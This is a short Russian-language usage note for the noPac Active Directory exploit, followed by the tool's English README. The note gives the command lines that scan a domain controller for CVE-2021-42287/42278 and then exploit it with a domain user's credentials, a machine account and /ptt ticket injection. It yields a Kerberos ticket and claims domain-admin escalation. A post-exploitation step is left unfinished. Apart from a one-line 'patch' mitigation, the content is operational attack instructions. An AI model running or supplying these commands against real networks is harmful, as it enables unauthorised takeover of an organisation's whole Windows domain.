```
1. Выше скомпилил екзешник из оригинальных исходников автора експа 
2. Скан
.\noPac.exe scan -domain domain.local -user user -pass Password!@#
3. Експлойт
.\noPac.exe -domain domain.local -user user -pass Password!@# /dc DC01 /mAccount pdc /mPassword Qwerty123 /service cifs /ptt

-> на выходе получаем строку в бейс64 и файлик кирби

4. Пост эксплуатация
.dopolnyu
```

# noPac

CVE-2021-42287/CVE-2021-42278 Scanner & Exploiter. Yet another low effort domain user to domain admin exploit.

If a Domain Controller is vulnerable it will return a TGT without a PAC, all eyes on small size tickets.

![](Images/scan.png)

![](Images/exploit.png)

## Mitigation

Patch your Domain Controllers!

## Credits

[Charlie Clark](https://twitter.com/exploitph) for his Rubeus fork and [Kevin Robertson](https://twitter.com/kevin_robertson) for SharpMad
